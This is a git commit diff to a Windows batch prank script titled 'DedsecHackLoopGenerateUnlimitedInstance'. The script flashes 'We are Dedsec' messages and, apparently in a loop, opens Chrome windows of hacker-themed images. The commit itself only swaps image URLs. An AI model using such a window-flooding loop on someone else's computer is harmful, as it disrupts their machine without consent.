54c11b8f24a99610d6cd6f679102920ddc108a67
nwy140 <nwy140@gmail.com>
2017-09-14 10:56:25 +0800

    Update DedsecHackLoopGenerateUnlimitedInstance.bat

--- DedsecHackLoopGenerateUnlimitedInstance.bat
+++ DedsecHackLoopGenerateUnlimitedInstance.bat
@@ -1,6 +1,9 @@
 msg * We are Dedsec 
 
 start chrome -app=https://www.youtube.com/embed/ukz24LrggmU
+start chrome --app=https://68.media.tumblr.com/124a855699f59409078f7f23c0f225cc/tumblr_oancbjkgyF1uedxbxo2_500.gif
+start chrome --app=http://orig08.deviantart.net/9039/f/2016/164/b/c/dedsec_skull_noise_by_junguler-da6229q.gif
+
 timeout 20
 
 :loop2
@@ -9,9 +12,8 @@ timeout 20
 REM Showing DEDSEC
 msg * We are Dedsec 
 
-start chrome --app=https://68.media.tumblr.com/124a855699f59409078f7f23c0f225cc/tumblr_oancbjkgyF1uedxbxo2_500.gif
-start chrome --app=http://orig08.deviantart.net/9039/f/2016/164/b/c/dedsec_skull_noise_by_junguler-da6229q.gif
-
+start chrome --app=https://i.ytimg.com/vi/tudBj-89NHU/maxresdefault.jpg
+start chrome --app=https://pbs.twimg.com/profile_images/799694625153937408/etRAebbW.jpg
 
 
 REM Your Username here
